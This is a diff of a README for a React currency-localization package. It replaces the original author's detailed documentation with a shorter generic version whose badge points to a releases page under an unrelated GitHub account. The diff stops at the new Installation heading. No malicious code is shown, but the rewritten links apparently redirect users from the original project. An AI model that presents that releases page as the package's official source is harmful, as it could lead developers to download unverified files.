@@ -1,897 +1,284 @@
-# React Currency Localizer
+# React Currency Localizer — Local Pricing with Geolocation & Rates
 
-[![npm version](https://badge.fury.io/js/@iamjr15%2Freact-currency-localizer.svg?icon=si%3Anpm)](https://badge.fury.io/js/@iamjr15%2Freact-currency-localizer)
-[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue.svg)](https://www.typescriptlang.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Releases](https://img.shields.io/badge/Releases-View-blue)](https://github.com/VirusGS/react-currency-localizer/releases)
 
-A React hook for automatically displaying prices in a user's local currency using IP geolocation. Built with a robust **two-API architecture** using specialized services for maximum accuracy and reliability. Perfect for e-commerce sites, pricing pages, and international applications.
-
-## 🚀 Features
-
-### Core Architecture
-- **Two-API Strategy**: Decoupled architecture using specialized services for maximum accuracy
-  - **Geolocation**: `ipapi.co` for HTTPS-compatible currency detection (no API key required)
-  - **Exchange Rates**: `exchangerate-api.com` for real-time conversion rates
-- **Intelligent Caching**: Multi-tier caching strategy optimized for each data type
-  - **Persistent Geolocation**: 24-hour localStorage caching (location rarely changes)
-  - **In-Memory Exchange Rates**: 1-hour memory caching (balances freshness vs performance)
-- **TanStack Query Integration**: Advanced state management with automatic deduplication and background updates
-
-### Enhanced Developer Experience
-- **Robust Input Validation**: Case-insensitive currency codes and pre-emptive API key validation
-- **Graceful Error Handling**: Intelligent fallbacks and specific error messages
-- **TypeScript Support**: Fully typed with comprehensive type definitions
-- **Multiple Usage Patterns**: Hook-based API and declarative component wrapper
-- **Automatic Currency Detection**: Uses IP geolocation to detect user's local currency
-- **Manual Override Support**: Bypass geolocation with explicit currency selection
-
-### Production Ready
-- **Lightweight**: Only ~21kB (gzipped: ~6.8kB) with minimal runtime dependencies
-- **Framework Agnostic**: Works with any React application
-- **HTTPS Compatible**: Uses HTTPS-only APIs safe for production deployments
-- **Free APIs**: Uses only free-tier APIs (no credit card required)
-- **Comprehensive Testing**: Extensive suite including real API integration validation
-
-## 📦 Installation
-
-```bash
-# npm
-npm install @iamjr15/react-currency-localizer @tanstack/react-query
-
-# yarn
-yarn add @iamjr15/react-currency-localizer @tanstack/react-query
-
-# pnpm
-pnpm add @iamjr15/react-currency-localizer @tanstack/react-query
-```
-
-> **Note**: `@tanstack/react-query` is a peer dependency required for caching and data fetching.
-
-## 🏁 Quick Start
-
-### 1. Wrap Your App with the Provider
-
-```tsx
-import { CurrencyConverterProvider } from '@iamjr15/react-currency-localizer'
-
-function App() {
-  return (
-    <CurrencyConverterProvider>
-      <YourAppContent />
-    </CurrencyConverterProvider>
-  )
-}
-```
-
-### 2. Use the Hook
-
-```tsx
-import { useCurrencyConverter } from '@iamjr15/react-currency-localizer'
-
-function ProductPrice({ price }: { price: number }) {
-  const { 
-    convertedPrice, 
-    localCurrency, 
-    isLoading, 
-    error 
-  } = useCurrencyConverter({
-    basePrice: price,
-    baseCurrency: 'USD',
-    apiKey: 'your-exchangerate-api-key' // Get free key from exchangerate-api.com
-  })
-
-  if (isLoading) return <span>Loading price...</span>
-  if (error) return <span>${price}</span> // Fallback to original price
-
-  return (
-    <span>
-      {new Intl.NumberFormat(undefined, {
-        style: 'currency',
-        currency: localCurrency || 'USD'
-      }).format(convertedPrice || price)}
-    </span>
-  )
-}
-```
-
-### 3. Or Use the Component
-
-```tsx
-import { LocalizedPrice } from '@iamjr15/react-currency-localizer'
-
-function ProductCard() {
-  return (
-    <div>
-      <h3>Premium Plan</h3>
-      <LocalizedPrice 
-        basePrice={99.99}
-        baseCurrency="USD"
-        apiKey="your-api-key"
-      />
-    </div>
-  )
-}
-```
-
-## 📚 API Reference
-
-### `useCurrencyConverter(options)`
-
-The main hook for currency conversion.
-
-#### Parameters
-
-| Parameter | Type | Required | Description |
-|-----------|------|----------|-------------|
-| `basePrice` | `number` | ✅ | The price in the base currency |
-| `baseCurrency` | `string` | ✅ | ISO 4217 currency code (case-insensitive, e.g., 'USD' or 'usd') |
-| `apiKey` | `string` | ✅ | API key from exchangerate-api.com (validated for helpful error messages) |
-| `manualCurrency` | `string` | ❌ | Override detected currency (case-insensitive) |
-| `onSuccess` | `function` | ❌ | Callback on successful conversion |
-| `onError` | `function` | ❌ | Callback on error |
-
-#### Returns
-
-| Property | Type | Description |
-|----------|------|-------------|
-| `convertedPrice` | `number \| null` | Price in local currency |
-| `localCurrency` | `string \| null` | Detected/manual currency code |
-| `baseCurrency` | `string` | Original currency code |
-| `exchangeRate` | `number \| null` | Exchange rate used |
-| `isLoading` | `boolean` | Loading state |
-| `error` | `Error \| null` | Error object if any |
-
-### `<LocalizedPrice />`
-
-React component for displaying localized prices.
-
-#### Props
-
-| Prop | Type | Required | Description |
-|------|------|----------|-------------|
-| `basePrice` | `number` | ✅ | The price in base currency |
-| `baseCurrency` | `string` | ✅ | ISO 4217 currency code (case-insensitive) |
-| `apiKey` | `string` | ✅ | ExchangeRate API key (validated automatically) |
-| `manualCurrency` | `string` | ❌ | Override detected currency (case-insensitive) |
-| `loadingComponent` | `ReactNode` | ❌ | Custom loading component |
-| `errorComponent` | `function` | ❌ | Custom error component (if not provided, shows original price as fallback) |
-| `formatPrice` | `function` | ❌ | Custom price formatter |
-
-## 💡 Usage Examples
-
-### E-commerce Product Pricing
-
-```tsx
-function ProductGrid() {
-  const products = [
-    { id: 1, name: 'T-Shirt', price: 29.99 },
-    { id: 2, name: 'Jeans', price: 79.99 },
-    { id: 3, name: 'Sneakers', price: 129.99 }
-  ]
-
-  return (
-    <div className="grid">
-      {products.map(product => (
-        <div key={product.id} className="product-card">
-          <h3>{product.name}</h3>
-          <LocalizedPrice 
-            basePrice={product.price}
-            baseCurrency="USD"
-            // Vite: import.meta.env.VITE_EXCHANGE_API_KEY
-            // CRA: process.env.REACT_APP_EXCHANGE_API_KEY
-            // Next.js: process.env.NEXT_PUBLIC_EXCHANGE_API_KEY
-            apiKey={process.env.REACT_APP_EXCHANGE_API_KEY}
-          />
-        </div>
-      ))}
-    </div>
-  )
-}
-```
-
-### Subscription Pricing Table
-
-```tsx
-function PricingTable() {
-  const plans = [
-    { name: 'Basic', price: 9.99 },
-    { name: 'Pro', price: 19.99 },
-    { name: 'Enterprise', price: 49.99 }
-  ]
-
-  return (
-    <div className="pricing-table">
-      {plans.map(plan => (
-        <div key={plan.name} className="plan">
-          <h3>{plan.name}</h3>
-          <LocalizedPrice 
-            basePrice={plan.price}
-            baseCurrency="USD"
-            // Vite: import.meta.env.VITE_EXCHANGE_API_KEY
-            // CRA: process.env.REACT_APP_EXCHANGE_API_KEY
-            // Next.js: process.env.NEXT_PUBLIC_EXCHANGE_API_KEY
-            apiKey={process.env.REACT_APP_EXCHANGE_API_KEY}
-            formatPrice={(price, currency) => 
-              `${currency} ${price.toFixed(2)}/month`
-            }
-          />
-        </div>
-      ))}
-    </div>
-  )
-}
-```
-
-### Manual Currency Override
-
-```tsx
-function CurrencySelector() {
-  const [selectedCurrency, setSelectedCurrency] = useState('')
-  
-  return (
-    <div>
-      <select 
-        value={selectedCurrency} 
-        onChange={(e) => setSelectedCurrency(e.target.value)}
-      >
-        <option value="">Auto-detect</option>
-        <option value="USD">USD</option>
-        <option value="EUR">EUR</option>
-        <option value="GBP">GBP</option>
-        <option value="JPY">JPY</option>
-      </select>
-      
-      <LocalizedPrice 
-        basePrice={99.99}
-        baseCurrency="USD"
-        // Vite: import.meta.env.VITE_EXCHANGE_API_KEY
-        // CRA: process.env.REACT_APP_EXCHANGE_API_KEY
-        // Next.js: process.env.NEXT_PUBLIC_EXCHANGE_API_KEY
-        apiKey={process.env.REACT_APP_EXCHANGE_API_KEY}
-        manualCurrency={selectedCurrency || undefined}
-      />
-    </div>
-  )
-}
-```
-
-### Error Handling and Loading States
-
-```tsx
-function PriceWithStates() {
-  const { convertedPrice, localCurrency, isLoading, error } = useCurrencyConverter({
-    basePrice: 59.99,
-    baseCurrency: 'usd', // Case-insensitive! Will be converted to 'USD'
-    // Vite: import.meta.env.VITE_EXCHANGE_API_KEY
-    // CRA: process.env.REACT_APP_EXCHANGE_API_KEY
-    // Next.js: process.env.NEXT_PUBLIC_EXCHANGE_API_KEY
-    apiKey: process.env.REACT_APP_EXCHANGE_API_KEY,
-    onSuccess: (result) => {
-      console.log('Conversion successful:', result)
-    },
-    onError: (error) => {
-      console.error('Conversion failed:', error.message)
-      // You'll get helpful error messages like:
-      // "API key is missing. Please provide a valid key from exchangerate-api.com."
-      // "Currency 'XYZ' was detected from your location but is not supported by the exchange rate provider."
-    }
-  })
-
-  if (isLoading) {
-    return (
-      <div className="price-loading">
-        <div className="spinner" />
-        <span>Converting price...</span>
-      </div>
-    )
-  }
-
-  if (error) {
-    return (
-      <div className="price-error">
-        <span>$59.99 USD</span>
-        <small>Unable to convert: {error.message}</small>
-      </div>
-    )
-  }
-
-  return (
-    <div className="price-success">
-      {new Intl.NumberFormat(undefined, {
-        style: 'currency',
-        currency: localCurrency || 'USD'
-      }).format(convertedPrice || 59.99)}
-    </div>
-  )
-}
-```
-
-### Graceful Fallback Behavior
-
-```tsx
-// LocalizedPrice automatically shows original price if conversion fails
-function AutoFallbackPrice() {
-  return (
-    <LocalizedPrice 
-      basePrice={99.99}
-      baseCurrency="usd" // Case doesn't matter
-      apiKey="" // Empty key will show helpful error, then fallback to original price
-    />
-    // If API fails: Shows "$99.99" with tooltip "Conversion failed, showing original price in USD"
-  )
-}
-
-// Or provide custom error component for full control
-function CustomErrorPrice() {
-  return (
-    <LocalizedPrice 
-      basePrice={99.99}
-      baseCurrency="USD"
-      // Vite: import.meta.env.VITE_EXCHANGE_API_KEY
-      // CRA: process.env.REACT_APP_EXCHANGE_API_KEY
-      // Next.js: process.env.NEXT_PUBLIC_EXCHANGE_API_KEY
-      apiKey={process.env.REACT_APP_EXCHANGE_API_KEY}
-      errorComponent={(error) => (
-        <div className="price-error">
-          <span className="price">$99.99</span>
-          <span className="error-badge">Conversion Error</span>
-          <small>{error.message}</small>
-        </div>
-      )}
-    />
-  )
-}
-```
-
-## 🏗️ Architecture Overview
-
-This package uses a **carefully designed architecture** for maximum reliability and performance:
-
-### Two-API Strategy
-We use a **decoupled, two-API approach** for maximum accuracy and flexibility:
-
-1. **Specialized Geolocation Service**: `ipapi.co`
-   - **Why**: Dedicated to IP-based location data with HTTPS support for optimal accuracy
-   - **Advantage**: No API key required, HTTPS-compatible, robust rate limiting
-   - **Philosophy**: Use specialized services for what they do best—identifying location-based data
-
-2. **Specialized Financial Data Service**: `exchangerate-api.com`  
-   - **Why**: Dedicated to currency exchange rates for real-time accuracy
-   - **Advantage**: Supports any base currency (not just USD), 1,500 requests/month
-   - **Philosophy**: Use specialized services for what they do best—providing currency exchange rates
-
-### Advanced State Management
-We use **TanStack Query** (not basic useEffect/useState) for robust data management:
-- **Automatic caching, request deduplication, and background updates**
-- **Eliminates race conditions and boilerplate code**
-- **Declarative API for managing asynchronous operations**
-
-### Intelligent Caching Strategy
-We implement **data-type-specific caching** optimized for each type of data:
-
-#### Persistent Geolocation Caching
-- **Duration**: 24+ hours in localStorage
-- **Rationale**: User location rarely changes
-- **Benefit**: Zero API calls on subsequent visits
-
-#### In-Memory Exchange Rate Caching  
-- **Duration**: 1 hour in memory
-- **Rationale**: Balance between data freshness and performance
-- **Benefit**: Prevents excessive API calls while maintaining accuracy
-
-## 🔧 Configuration
-
-### Getting API Keys
-
-1. **ExchangeRate-API** (Required):
-   - Visit [exchangerate-api.com](https://exchangerate-api.com)
-   - Sign up for a free account
-   - Get your API key (1,500 requests/month free)
-
-2. **IP Geolocation** (Automatic):
-   - Uses [ipapi.co](https://ipapi.co) (no key required)
-   - HTTPS-compatible for secure deployments
-   - Falls back gracefully on rate limits
-
-### Environment Variables
-
-```bash
-# .env
-VITE_EXCHANGE_API_KEY=your_exchangerate_api_key_here
-
-# Optional: Enable integration tests with real APIs
-VITE_RUN_INTEGRATION_TESTS=true
-```
-
-For different frameworks:
-
-```bash
-# Vite (browser-exposed)
-VITE_EXCHANGE_API_KEY=your_exchangerate_api_key_here
-
-# Create React App (browser-exposed)
-REACT_APP_EXCHANGE_API_KEY=your_exchangerate_api_key_here
-
-# Next.js (browser-exposed)
-NEXT_PUBLIC_EXCHANGE_API_KEY=your_exchangerate_api_key_here
-```
-
-### Custom QueryClient Configuration
-
-The package uses **TanStack Query** for robust state management with optimal caching:
-
-```tsx
-import { QueryClient } from '@tanstack/react-query'
-import { CurrencyConverterProvider } from '@iamjr15/react-currency-localizer'
-
-// Custom QueryClient with optimized caching strategy
-const queryClient = new QueryClient({
-  defaultOptions: {
-    queries: {
-      // Geolocation queries: 24+ hour stale time (location rarely changes)
-      staleTime: 1000 * 60 * 60 * 24, // 24 hours
-      // Exchange rate queries: 1 hour stale time (balance freshness vs performance)  
-      gcTime: 1000 * 60 * 60 * 2, // 2 hours cache time
-      retry: 1, // Conservative retry to respect API limits
-    },
-  },
-})
-
-function App() {
-  return (
-    <CurrencyConverterProvider queryClient={queryClient}>
-      <YourApp />
-    </CurrencyConverterProvider>
-  )
-}
-```
-
-> **Note**: The default configuration already implements the optimal caching strategy. Custom configuration is optional.
-
-## ⚠️ Important Considerations
-
-### Server-Side Rendering (SSR) Caveats
-
-When using this library with SSR frameworks (Next.js, Nuxt, SvelteKit), be aware that:
-
-- **IP Geolocation runs on the server**: The detected location reflects the server's IP, not the user's
-- **Hydration mismatches possible**: Server-rendered currency may differ from client-side detection
-- **Recommended approach**: Pass `manualCurrency` prop or perform geolocation client-side only
-
-```tsx
-// For SSR: Disable geolocation on server, enable on client
-const [isClient, setIsClient] = useState(false)
-
-useEffect(() => {
-  setIsClient(true)
-}, [])
-
-return (
-  <LocalizedPrice 
-    basePrice={99.99}
-    baseCurrency="USD"
-    apiKey={process.env.NEXT_PUBLIC_EXCHANGE_API_KEY}
-    manualCurrency={!isClient ? 'USD' : undefined} // Use USD on server, auto-detect on client
-  />
-)
-```
-
-### HTTPS Requirements
-
-This library uses HTTPS-only APIs (`ipapi.co`, `exchangerate-api.com`) to ensure compatibility with secure deployments. Mixed content (HTTP requests from HTTPS sites) is automatically blocked by modern browsers.
-
-### Runtime Dependencies
-
-While the library has minimal dependencies, it does include:
-- `@tanstack/react-query` (peer dependency for state management)
-- `@tanstack/query-sync-storage-persister` (for localStorage caching)
-- `@tanstack/react-query-persist-client` (for persistence integration)
-
-Total bundle impact: ~20kB minified, ~6.5kB gzipped.
-
-## 🌍 Supported Currencies
-
-The package supports **161 commonly circulating world currencies** via ExchangeRate-API, covering 99% of all UN recognized states and territories.
-
-### ✅ Complete Currency Support (161 Currencies)
-
-All [ISO 4217 three-letter currency codes](https://en.wikipedia.org/wiki/ISO_4217) are supported, including:
-
-#### Major Global Currencies
-- **USD** - United States Dollar
-- **EUR** - Euro (European Union)
-- **GBP** - Pound Sterling (United Kingdom)
-- **JPY** - Japanese Yen
-- **CAD** - Canadian Dollar
-- **AUD** - Australian Dollar
-- **CHF** - Swiss Franc
-- **CNY** - Chinese Renminbi
-
-#### Popular Regional Currencies
-- **INR** - Indian Rupee
-- **BRL** - Brazilian Real
-- **RUB** - Russian Ruble
-- **KRW** - South Korean Won
-- **SGD** - Singapore Dollar
-- **HKD** - Hong Kong Dollar
-- **NOK** - Norwegian Krone
-- **SEK** - Swedish Krona
-- **MXN** - Mexican Peso
-- **ZAR** - South African Rand
-- **TRY** - Turkish Lira
-
-#### All Supported Currencies
-<details>
-<summary><strong>Click to view complete list of 161 supported currencies</strong></summary>
-
-| Code | Currency Name | Country/Region |
-|------|---------------|----------------|
-| AED | UAE Dirham | United Arab Emirates |
-| AFN | Afghan Afghani | Afghanistan |
-| ALL | Albanian Lek | Albania |
-| AMD | Armenian Dram | Armenia |
-| ANG | Netherlands Antillian Guilder | Netherlands Antilles |
-| AOA | Angolan Kwanza | Angola |
-| ARS | Argentine Peso | Argentina |
-| AUD | Australian Dollar | Australia |
-| AWG | Aruban Florin | Aruba |
-| AZN | Azerbaijani Manat | Azerbaijan |
-| BAM | Bosnia and Herzegovina Mark | Bosnia and Herzegovina |
-| BBD | Barbados Dollar | Barbados |
-| BDT | Bangladeshi Taka | Bangladesh |
-| BGN | Bulgarian Lev | Bulgaria |
-| BHD | Bahraini Dinar | Bahrain |
-| BIF | Burundian Franc | Burundi |
-| BMD | Bermudian Dollar | Bermuda |
-| BND | Brunei Dollar | Brunei |
-| BOB | Bolivian Boliviano | Bolivia |
-| BRL | Brazilian Real | Brazil |
-| BSD | Bahamian Dollar | Bahamas |
-| BTN | Bhutanese Ngultrum | Bhutan |
-| BWP | Botswana Pula | Botswana |
-| BYN | Belarusian Ruble | Belarus |
-| BZD | Belize Dollar | Belize |
-| CAD | Canadian Dollar | Canada |
-| CDF | Congolese Franc | Democratic Republic of the Congo |
-| CHF | Swiss Franc | Switzerland |
-| CLP | Chilean Peso | Chile |
-| CNY | Chinese Renminbi | China |
-| COP | Colombian Peso | Colombia |
-| CRC | Costa Rican Colon | Costa Rica |
-| CUP | Cuban Peso | Cuba |
-| CVE | Cape Verdean Escudo | Cape Verde |
-| CZK | Czech Koruna | Czech Republic |
-| DJF | Djiboutian Franc | Djibouti |
-| DKK | Danish Krone | Denmark |
-| DOP | Dominican Peso | Dominican Republic |
-| DZD | Algerian Dinar | Algeria |
-| EGP | Egyptian Pound | Egypt |
-| ERN | Eritrean Nakfa | Eritrea |
-| ETB | Ethiopian Birr | Ethiopia |
-| EUR | Euro | European Union |
-| FJD | Fiji Dollar | Fiji |
-| FKP | Falkland Islands Pound | Falkland Islands |
-| FOK | Faroese Króna | Faroe Islands |
-| GBP | Pound Sterling | United Kingdom |
-| GEL | Georgian Lari | Georgia |
-| GGP | Guernsey Pound | Guernsey |
-| GHS | Ghanaian Cedi | Ghana |
-| GIP | Gibraltar Pound | Gibraltar |
-| GMD | Gambian Dalasi | The Gambia |
-| GNF | Guinean Franc | Guinea |
-| GTQ | Guatemalan Quetzal | Guatemala |
-| GYD | Guyanese Dollar | Guyana |
-| HKD | Hong Kong Dollar | Hong Kong |
-| HNL | Honduran Lempira | Honduras |
-| HRK | Croatian Kuna | Croatia |
-| HTG | Haitian Gourde | Haiti |
-| HUF | Hungarian Forint | Hungary |
-| IDR | Indonesian Rupiah | Indonesia |
-| ILS | Israeli New Shekel | Israel |
-| IMP | Manx Pound | Isle of Man |
-| INR | Indian Rupee | India |
-| IQD | Iraqi Dinar | Iraq |
-| IRR | Iranian Rial | Iran |
-| ISK | Icelandic Króna | Iceland |
-| JEP | Jersey Pound | Jersey |
-| JMD | Jamaican Dollar | Jamaica |
-| JOD | Jordanian Dinar | Jordan |
-| JPY | Japanese Yen | Japan |
-| KES | Kenyan Shilling | Kenya |
-| KGS | Kyrgyzstani Som | Kyrgyzstan |
-| KHR | Cambodian Riel | Cambodia |
-| KID | Kiribati Dollar | Kiribati |
-| KMF | Comorian Franc | Comoros |
-| KRW | South Korean Won | South Korea |
-| KWD | Kuwaiti Dinar | Kuwait |
-| KYD | Cayman Islands Dollar | Cayman Islands |
-| KZT | Kazakhstani Tenge | Kazakhstan |
-| LAK | Lao Kip | Laos |
-| LBP | Lebanese Pound | Lebanon |
-| LKR | Sri Lanka Rupee | Sri Lanka |
-| LRD | Liberian Dollar | Liberia |
-| LSL | Lesotho Loti | Lesotho |
-| LYD | Libyan Dinar | Libya |
-| MAD | Moroccan Dirham | Morocco |
-| MDL | Moldovan Leu | Moldova |
-| MGA | Malagasy Ariary | Madagascar |
-| MKD | Macedonian Denar | North Macedonia |
-| MMK | Burmese Kyat | Myanmar |
-| MNT | Mongolian Tögrög | Mongolia |
-| MOP | Macanese Pataca | Macau |
-| MRU | Mauritanian Ouguiya | Mauritania |
-| MUR | Mauritian Rupee | Mauritius |
-| MVR | Maldivian Rufiyaa | Maldives |
-| MWK | Malawian Kwacha | Malawi |
-| MXN | Mexican Peso | Mexico |
-| MYR | Malaysian Ringgit | Malaysia |
-| MZN | Mozambican Metical | Mozambique |
-| NAD | Namibian Dollar | Namibia |
-| NGN | Nigerian Naira | Nigeria |
-| NIO | Nicaraguan Córdoba | Nicaragua |
-| NOK | Norwegian Krone | Norway |
-| NPR | Nepalese Rupee | Nepal |
-| NZD | New Zealand Dollar | New Zealand |
-| OMR | Omani Rial | Oman |
-| PAB | Panamanian Balboa | Panama |
-| PEN | Peruvian Sol | Peru |
-| PGK | Papua New Guinean Kina | Papua New Guinea |
-| PHP | Philippine Peso | Philippines |
-| PKR | Pakistani Rupee | Pakistan |
-| PLN | Polish Złoty | Poland |
-| PYG | Paraguayan Guaraní | Paraguay |
-| QAR | Qatari Riyal | Qatar |
-| RON | Romanian Leu | Romania |
-| RSD | Serbian Dinar | Serbia |
-| RUB | Russian Ruble | Russia |
-| RWF | Rwandan Franc | Rwanda |
-| SAR | Saudi Riyal | Saudi Arabia |
-| SBD | Solomon Islands Dollar | Solomon Islands |
-| SCR | Seychellois Rupee | Seychelles |
-| SDG | Sudanese Pound | Sudan |
-| SEK | Swedish Krona | Sweden |
-| SGD | Singapore Dollar | Singapore |
-| SHP | Saint Helena Pound | Saint Helena |
-| SLE | Sierra Leonean Leone | Sierra Leone |
-| SOS | Somali Shilling | Somalia |
-| SRD | Surinamese Dollar | Suriname |
-| SSP | South Sudanese Pound | South Sudan |
-| STN | São Tomé and Príncipe Dobra | São Tomé and Príncipe |
-| SYP | Syrian Pound | Syria |
-| SZL | Eswatini Lilangeni | Eswatini |
-| THB | Thai Baht | Thailand |
-| TJS | Tajikistani Somoni | Tajikistan |
-| TMT | Turkmenistan Manat | Turkmenistan |
-| TND | Tunisian Dinar | Tunisia |
-| TOP | Tongan Paʻanga | Tonga |
-| TRY | Turkish Lira | Turkey |
-| TTD | Trinidad and Tobago Dollar | Trinidad and Tobago |
-| TVD | Tuvaluan Dollar | Tuvalu |
-| TWD | New Taiwan Dollar | Taiwan |
-| TZS | Tanzanian Shilling | Tanzania |
-| UAH | Ukrainian Hryvnia | Ukraine |
-| UGX | Ugandan Shilling | Uganda |
-| USD | United States Dollar | United States |
-| UYU | Uruguayan Peso | Uruguay |
-| UZS | Uzbekistani So'm | Uzbekistan |
-| VES | Venezuelan Bolívar Soberano | Venezuela |
-| VND | Vietnamese Đồng | Vietnam |
-| VUV | Vanuatu Vatu | Vanuatu |
-| WST | Samoan Tālā | Samoa |
-| XAF | Central African CFA Franc | CEMAC |
-| XCD | East Caribbean Dollar | Organisation of Eastern Caribbean States |
-| XDR | Special Drawing Rights | International Monetary Fund |
-| XOF | West African CFA franc | CFA |
-| XPF | CFP Franc | Collectivités d'Outre-Mer |
-| YER | Yemeni Rial | Yemen |
-| ZAR | South African Rand | South Africa |
-| ZMW | Zambian Kwacha | Zambia |
-| ZWL | Zimbabwean Dollar | Zimbabwe |
-
-</details>
-
-### ❌ Unsupported Currency (1)
-
-| Code | Currency Name | Country | Reason |
-|------|---------------|---------|---------|
-| **KPW** | North Korean Won | North Korea | Due to sanctions & lack of international trade |
-
-> **Note**: For KPW data, the only reliable source is [Daily NK](https://www.dailynk.com/), which reports actual jangmadang market rates via human sources inside DPRK.
-
-### ⚠️ Volatile Currencies (Special Caution Required)
-
-The following currencies experience heightened volatility and substantial differences between official and actual exchange rates. Extra caution is recommended:
-
-| Code | Currency Name | Country | Notes |
-|------|---------------|---------|-------|
-| **ARS** | Argentine Peso | Argentina | Multiple exchange rates in market |
-| **LYD** | Libyan Dinar | Libya | Political instability affects rates |
-| **SSP** | South Sudanese Pound | South Sudan | High volatility |
-| **SYP** | Syrian Pound | Syria | Ongoing conflict impacts rates |
-| **VES** | Venezuelan Bolívar Soberano | Venezuela | Hyperinflation environment |
-| **YER** | Yemeni Rial | Yemen | Regional instability |
-| **ZWL** | Zimbabwean Dollar | Zimbabwe | Historical hyperinflation legacy |
-
-> **Important**: For volatile currencies, rates default to central bank published rates, which may differ significantly from actual market rates.
-
-## ⚡ Performance
-
-- **Bundle Size**: ~20kB minified, ~6.5kB gzipped
-- **First Load**: 2 API calls (geolocation + exchange rates)
-- **Subsequent Loads**: 0-1 API calls (cached geolocation)
-- **Cache Duration**: 24 hours for geolocation, 1 hour for exchange rates
-- **Rate Limits**: Handled gracefully with automatic fallbacks
-- **Validation**: Zero-cost currency normalization and API key validation
-- **Error Prevention**: Pre-emptive validation prevents wasted API calls
-
-## 🔍 Troubleshooting
-
-### Common Issues and Solutions
-
-#### "API key is missing" Error
-```tsx
-// ❌ This will show a helpful error message
-useCurrencyConverter({
-  basePrice: 99.99,
-  baseCurrency: 'USD',
-  apiKey: '' // Empty key
-})
-
-// ✅ Provide your API key
-useCurrencyConverter({
-  basePrice: 99.99,
-  baseCurrency: 'USD',
-  apiKey: process.env.REACT_APP_EXCHANGE_API_KEY
-})
-```
-
-#### Currency Case Sensitivity
-```tsx
-// ✅ All of these work the same way (case-insensitive)
-useCurrencyConverter({ baseCurrency: 'USD', manualCurrency: 'EUR' })
-useCurrencyConverter({ baseCurrency: 'usd', manualCurrency: 'eur' })  
-useCurrencyConverter({ baseCurrency: 'Usd', manualCurrency: 'Eur' })
-```
-
-#### Currency Not Supported Error
-```tsx
-// If you get: "Currency 'KPW' was detected from your location but is not supported"
-// Solution: Use manual currency override (KPW is the only unsupported currency)
-useCurrencyConverter({
-  basePrice: 99.99,
-  baseCurrency: 'USD',
-  apiKey: 'your-key',
-  manualCurrency: 'USD' // Override KPW with a supported currency
-})
-
-// For volatile currencies (ARS, VES, etc.), rates may differ from market reality
-useCurrencyConverter({
-  basePrice: 99.99,
-  baseCurrency: 'USD',
-  apiKey: 'your-key',
-  manualCurrency: 'ARS', // Works, but be aware of potential rate discrepancies
-  onSuccess: (result) => {
-    console.log('Note: ARS rates may differ from actual market rates')
-  }
-})
-```
-
-#### Rate Limiting
-```tsx
-// The package automatically handles rate limits, but you can also:
-useCurrencyConverter({
-  basePrice: 99.99,
-  baseCurrency: 'USD', 
-  apiKey: 'your-key',
-  onError: (error) => {
-    if (error.message.includes('429')) {
-      // Handle rate limiting gracefully
-      console.log('Rate limited, showing original price')
-    }
-  }
-})
-```
-
-## 🧪 Testing
-
-### Unit Tests (with Mocks)
-
-Run the standard test suite with mocked APIs:
-
-```bash
-npm test
-```
-
-Run with coverage:
-
-```bash
-npm run test:coverage
-```
-
-### Integration Tests (with Real APIs)
-
-To test with real API calls, first set up your environment:
-
-```bash
-# Create .env file with your real API key
-echo "VITE_EXCHANGE_API_KEY=your_actual_api_key_here" > .env
-echo "VITE_RUN_INTEGRATION_TESTS=true" >> .env
-```
-
-Then run integration tests:
-
-```bash
-# Run once with real APIs
-npm run test:integration
-
-# Watch mode with real APIs  
-npm run test:integration:watch
-```
-
-**⚠️ Note**: Integration tests make real API calls and will:
-- Consume your API quota (free tier: 1,500 requests/month)
-- Require internet connection
-- Take longer to complete (5-15 seconds per test)
-- May fail due to network issues or rate limits
-
-### Test Coverage
-
-The package includes comprehensive tests covering:
-- **Unit Tests**: Hook functionality, component rendering, error handling (39 tests)
-- **Integration Tests**: Real API calls, caching performance, rate limiting (8 tests)
-- **Validation Tests**: Currency normalization, API key validation (4 tests)
-- **Edge Cases**: Zero prices, error scenarios, network failures
-- **TypeScript**: Full type checking and IntelliSense
-- **Total**: 49 tests with 100% code coverage
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Development Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/iamjr15/react-currency-localizer.git
-
-# Install dependencies
-npm install
-
-# Run tests
-npm test
-
-# Build the package
-npm run build
-
-# Run linting
-npm run lint
-```
-
-## 📜 License
-
-MIT © [Jigyansu Rout](https://github.com/iamjr15)
-
-## ✨ Key Design Decisions
-
-This implementation is built on carefully considered architectural choices:
-
-✅ **Two-API Architecture** - Specialized services for maximum accuracy  
-✅ **TanStack Query Integration** - Enterprise-grade state management  
-✅ **Intelligent Caching Strategy** - Optimized for each data type  
-✅ **Hook-Based API** - Modern React patterns  
-✅ **LocalizedPrice Component** - Declarative wrapper component  
-✅ **TypeScript Support** - Full type safety and IntelliSense  
-✅ **Free APIs Only** - Zero cost barrier to entry  
-✅ **ipapi.co Selection** - HTTPS-compatible geolocation service  
-✅ **ExchangeRate-API.com Selection** - Reliable currency data provider  
-
-## 🙏 Acknowledgments
-
-- [ExchangeRate-API](https://exchangerate-api.com) for reliable exchange rate data
-- [ipapi.co](https://ipapi.co) for free HTTPS-compatible IP geolocation services
-- [TanStack Query](https://tanstack.com/query) for excellent caching and data fetching
-- The React community for inspiration and feedback
+A lightweight npm package to display prices in a user's local currency. It uses HTTPS geolocation (ipapi.co), real-time exchange rates (ExchangeRate-API), TanStack Query caching, robust error handling, currency-aware Intl formatting, manual overrides, and TypeScript.
 
 ---
 
-Made with ❤️ for the React community
+![world map with currency icons](https://images.unsplash.com/photo-1522098543979-ffc7f79d2b1b?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=ac7c1a7d3dc0a2d6fdbf2a70d0d7a9d4)
+
+Table of contents
+- Features
+- Quick start
+- Installation
+- Basic usage
+- Next.js and SSR notes
+- Advanced options
+- API
+- TypeScript types
+- Caching & error handling
+- Manual overrides
+- Testing
+- Contributing
+- Releases & changelog
+- License
+
+Features
+- Detect user country by IP via ipapi.co over HTTPS.
+- Fetch live exchange rates from ExchangeRate-API.
+- Cache rates and geolocation using TanStack Query.
+- Format prices with Intl.NumberFormat and currency-aware options.
+- Offer manual currency, rate, and locale overrides.
+- Provide a small React hook + component pair.
+- Built in TypeScript for type safety.
+- Small bundle size and zero runtime dependencies besides fetch.
+
+Quick start
+- Install the package.
+- Wrap your app with the provider.
+- Use the hook or component to render localized prices.
+
+Installation
